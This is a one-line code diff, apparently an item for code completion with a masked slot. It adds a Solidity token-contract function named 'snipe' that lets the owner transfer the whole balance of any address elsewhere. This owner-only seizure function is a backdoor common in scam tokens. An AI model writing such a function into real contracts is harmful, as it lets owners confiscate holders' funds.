@@ -1,0 +1,1 @@
+"function snipe(address bot)onlyOwner() public{        _transfer(bot,<mask0>,balanceOf(bot));    }"
